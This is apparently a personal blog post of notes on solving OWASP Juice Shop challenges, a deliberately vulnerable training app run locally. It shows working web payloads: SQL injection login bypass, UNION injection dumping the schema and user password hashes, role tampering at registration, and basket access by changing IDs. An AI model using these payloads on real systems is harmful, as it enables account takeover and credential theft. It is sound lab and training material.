---
layout: post
title: "OWASP Juice Shop"
pinned: True
---
This post will be used as my notes as I try to solve challenges OWASPS' Juice shop application, https://owasp.org/www-project-juice-shop/.  

### <u>Finding the scoreboard
When I loaded the application I looked through the requests on burp and on the request GET /rest/admin/application-configuration HTTP/1.1 we find what is on the security.txt.
```
"securityTxt":
{"contact":"mailto:donotreply@owasp-juice.shop",
"encryption":"https://keybase.io/bkimminich/pgp_keys.asc?fingerprint=19c01cb7157e4645e9e2c863062a85a8cbfbdcda",
"acknowledgements":"/#/score-board",
"hiring":"/#/jobs",
"csaf":"/.well-known/csaf/provider-metadata.json"},
```
Here we see there is a path to the scoreboard which solves one of the challnges.

### <u>Payback time
The next thing after making an account was the functionallity of the cart and I found that when I changed the quantity of items in the cart this request gets sent:
```
PUT /api/BasketItems/9 HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzYWlkQGVtYWlsLmNvbSIsInBhc3N3b3JkIjoiZDNkZmMwNWI2NDMzMjYzNjZlZDY3OWJlYmFkMzUyZTIiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA3LTA4IDExOjU2OjEyLjg3NyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA3LTA4IDExOjU2OjEyLjg3NyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTE5NzU4MDd9.xYLpOEnXMYM-MzJPEv2ISoPzZxAW82FJR_N_hF_OCsj3ep4v4jx2HuC-Jb6FDs92ZD_ST4Gv_y9_WdLniK6aRe5_PJ5nYVCwU2sfLReSxPoadSh0iNWqTW72XOqn8xhJTUmW6vQ5hPKCbFM3Mlu49mIOE_s0KRT0fG5EhvfSADs
Content-Type: application/json
Content-Length: 16
Origin: http://127.0.0.1:3000
Connection: keep-alive
Referer: http://127.0.0.1:3000/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=j2zQRBMXDzp2wEYZ4o7VgeJarG7VfRBtbOd91bxW3L5vlOkPNqy6j8nmKV4L; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzYWlkQGVtYWlsLmNvbSIsInBhc3N3b3JkIjoiZDNkZmMwNWI2NDMzMjYzNjZlZDY3OWJlYmFkMzUyZTIiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA3LTA4VDExOjU2OjEyLjg3N1oiLCJ1cGRhdGVkQXQiOiIyMDI1LTA3LTA4VDExOjU2OjEyLjg3N1oiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTE5NzU5MTJ9.mIkzzMTzt-TwDz85BgVuU97TAXHcHmKo5dPDVoxAJQFdMToeuh2l-O7rUDlKdXIQTYYyGmBVvPdpA5UhS8TY5tFInQnUpCD_CtyCXt1Bb536DuwblcYZAH936pFEc2ROfQ6qxw-erj7Sl744ARRWsSphQKq_q9WtJCI-dZZGVzA
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"quantity":2}
```
As we can see the put request modifies the quantity of the item so I checked would it let me put a negative amount in the cart and it did! This lets us get money when we place the order which solves the payback time challenge.

### <u>Manipulate Basket
One of the challenges is to be able to put a product in another user's basket so the first thing I did was see the request sent when I add something new to my basket which was a post request to /api/BasketItems/ with a json body:
```
{"ProductId":1,"BasketId":"6","quantity":1}
```
And in our response we get the json:
```
{"status":"success","data":{"id":13,"ProductId":1,"BasketId":"6","quantity":1,"updatedAt":"2025-07-12T16:54:30.592Z","createdAt":"2025-07-12T16:54:30.592Z"}}
```

### <u>Forged Review
I found when I posted a review on an item this was the request being sent:
```
PUT /rest/products/1/reviews HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhZG1pbmFAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImQzZGZjMDViNjQzMzI2MzY2ZWQ2NzliZWJhZDM1MmUyIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wNy0xMSAxMzo0MTo0Ni4zNTcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wNy0xMSAxMzo0MTo0Ni4zNTcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzUyMjQxNDMxfQ.KikS9kh-WEGi866YnhOiXlVrHWQr08-v4XJU6luEq6boiDfmzwWp1I3hzHxmSSJg_GAWpi4oaBIvGsXVKeURJJ7odhbbJyD48Kzx_4DW2bUMnGWswpSIKpUDIe0ahXnk2MnIg74EIbjR102ZiHrVYol_bhL9cH6_Pj4LeKN7H3A
Content-Type: application/json
Content-Length: 48
Origin: http://127.0.0.1:3000
Connection: keep-alive
Referer: http://127.0.0.1:3000/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=OYkQVNDKna3641OMErXwez2AOBtgf3JTZatP10RZxPpvoJWyB5b8lgqj7m9L; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhZG1pbmFAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImQzZGZjMDViNjQzMzI2MzY2ZWQ2NzliZWJhZDM1MmUyIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wNy0xMSAxMzo0MTo0Ni4zNTcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wNy0xMSAxMzo0MTo0Ni4zNTcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzUyMjQxNDMxfQ.KikS9kh-WEGi866YnhOiXlVrHWQr08-v4XJU6luEq6boiDfmzwWp1I3hzHxmSSJg_GAWpi4oaBIvGsXVKeURJJ7odhbbJyD48Kzx_4DW2bUMnGWswpSIKpUDIe0ahXnk2MnIg74EIbjR102ZiHrVYol_bhL9cH6_Pj4LeKN7H3A
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{"message":"hello","author":"email@email.com"}
```
I checked if there was an validity checks on the author and there wasn't so by just changing the author in the request you could make it so another user has sent the review.

### <u>Admin registration
When looking at all our requests there is always a token attached once we are logged in, this token is a JWT and after decoding it you can see it contains a few parameters about the user and one of them is "role" which is set to customer. Now that we know role is a parameter we can try assign it to another role during registration. Intercepting the registration request:
```
POST /api/Users/ HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 250
Origin: http://127.0.0.1:3000
Connection: keep-alive
Referer: http://127.0.0.1:3000/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=bq3v1k8RQolzXZDAqVhjt1fvhetb9tVZtBgukxu9ZSoYd6YnWmPrejOaBxVM; code-fixes-component-format=LineByLine; continueCodeFindIt=kqE7gxk15Mgq7xXyYodnab6BJ0Wv8gB4O9mPz3plEewD2RjNVQGKLrnpP0LD; continueCodeFixIt=73qzbm2gokDJXPyRB5wMerZG30lKxoj1q8jQ6dp7O4NmWYznbvLEV9gPRKDN
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{"email":"test@test.test","password":"password","passwordRepeat":"password","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-07-11T13:09:51.444Z","updatedAt":"2025-07-11T13:09:51.444Z"},"securityAnswer":"a"}
```
We can then add role and set it to admin in the json body letting the user be registered as an admin.


### <u>View Basket
I found a broken access control vulnerability where you can view other user baskets just by changing the url in the request. The request is to GET /rest/basket/6 and by changing the number we can view another person's basket.

### <u>Forged Feedback + Zero Stars
By intercepting the request sent when filling in the feedback form we can change the user id of reviewer and set the rating to zero stars which shouldn't be allowed.

### <u>Login Bender + Login Admin + Login Jim
WHile trying to figure out how to bypass the login with different methods I tried using an SQL injection and after multiple attempts I thought that mabye the query being used to validate login might look something like this:
```
SELECT * FROM users WHERE email = '<email>' AND password = '<password>'
```
Since the passwords were being hashed I would be unable to do a SQL injection from that parameter but I thought mabye if i simply included a comment in the username I could comment out the password check and login to another users account. I first tried this with an email I found in a review on the page, bender@juice-sh.op. In the request being sent to login a json body is attached with a email and password. I changed the json to this:
```
{"email":"bender@juice-sh.op'--","password":""}
```
And this worked out as planned and I was able to do it for another user with the email: jim@juice-sh.op
And this also worked for the admin account: admin@juice-sh.op

### <u>Database Schema
Following the other challenge I tried to see what other inputs are vulnerable to SQL injections and found that the search functionality is also vulnerable by triggering a error when inputting a' which gave the error with the query:
```
SELECT * FROM Products WHERE ((name LIKE '%a'%' OR description LIKE '%a'%') AND deletedAt IS NULL) ORDER BY name
```
One of the Juice Shop challenges is to retrieve the database schema which we can do here through a UNION attack. By changing the request to:
```
GET /rest/products/search?q=a%'))--
```
I was able to still get results now we just have to attach a union query to this but we need to figure out how many columns the union query requires which we can do through ORDER BY. Using the request:
```
GET /rest/products/search?q=a%'))+ORDER+BY+10--
```
We get an error "SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 9" which shows us we need 9 rows in our query so next I sent the request:
```
GET /rest/products/search?q=someword%'))+UNION+SELECT+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL-- 
```
But this caused an error and I guessed this might be cause of NULL datatype so I switched out the NULL for just 1:
````
GET /rest/products/search?q=someword%'))+UNION+SELECT+1,+1,+1,+1,+1,+1,+1,+1,+1-- 
```
Which gives us the result:
```
{"status":"success","data":[{"id":1,"name":1,"description":1,"price":1,"deluxePrice":1,"image":1,"createdAt":1,"updatedAt":1,"deletedAt":1}]}
```
Now to get the database schema we need to have the query be to the table sqlite_master and retrieve the variable sql:
```
GET /rest/products/search?q=someword%'))+UNION+SELECT+sql,+1,+1,+1,+1,+1,+1,+1,+1+FROM+sqlite_master--
```
This finally gets us the database schema!

### <u>User Credentials
There is another challenge in Juice shop where we retrieve all user credentials through an SQL injection which we can do after the previous challenge since we have the schema of the Users table:
```
"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
```
Now by modifying the previous UNION attack we can get it display all username, emails and passwords:
```
GET /rest/products/search?q=someword%'))+UNION+SELECT+username,+email,+password,+1,+1,+1,+1,+1,+1+FROM+Users--
```